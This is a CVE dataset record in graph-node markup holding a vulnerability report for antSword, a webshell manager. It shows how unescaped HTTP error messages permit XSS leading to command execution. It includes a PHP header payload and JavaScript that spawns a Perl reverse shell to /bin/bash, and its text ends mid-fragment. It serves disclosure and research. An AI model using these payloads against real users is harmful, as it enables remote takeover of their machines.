    <node id="CVE-2020-18766">
      <data key="d0">CVE</data>
      <data key="d1">javascript</data>
      <data key="d2">There is RCE Vulnerability in antSword</data>
      <data key="d3">想交某VE，所以下面就用英文先写了
When i connect to my webshell by antsword.If the connection fails, antSword will echo error information.
like this
![image.png](https://cdn.nlark.com/yuque/0/2019/png/298354/1553602142855-56d10288-a845-4aa3-ac37-9b50869d4bab.png#align=left&amp;display=inline&amp;height=777&amp;name=image.png&amp;originHeight=1398&amp;originWidth=2080&amp;size=536157&amp;status=done&amp;width=1156)
this information don't have xss protect,so i can xss and execute system command
My poc
```php
&lt;?php
header('HTTP/1.1 500 &lt;img src=# onerror=alert(1)&gt;');
```
![image.png](https://cdn.nlark.com/yuque/0/2019/png/298354/1553602490361-1adadb12-9131-47a8-85e6-1097ac7b3455.png#align=left&amp;display=inline&amp;height=446&amp;name=image.png&amp;originHeight=802&amp;originWidth=2054&amp;size=335238&amp;status=done&amp;width=1141)
My exp (for perl)
```php
&lt;?php

header("HTTP/1.1 406 Not &lt;img src=# onerror='eval(new Buffer(``,`base64`).toString())'&gt;");
?&gt;
```
base64_decode code
```javascript
require('child_process').exec('perl -e \'use Socket;$i="127.0.0.1";$p=1002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};\'',(error, stdout, stderr)=&gt;{
    alert(`stdout: ${stdout}`);
  });
```
getshell
![image.png](https://cdn.nlark.com/yuque/0/2019/png/298354/1553603776180-b0ce142b-67f2-443b-be87-2a9c02dc4bae.png#align=left&amp;display=inline&amp;height=400&amp;name=image.png&amp;originHeight=720&amp;originWidth=1778&amp;size=167970&amp;status=done&amp;width=988)

~/source/modules/filemanage/index.js   206
```
t</data>
    </node>
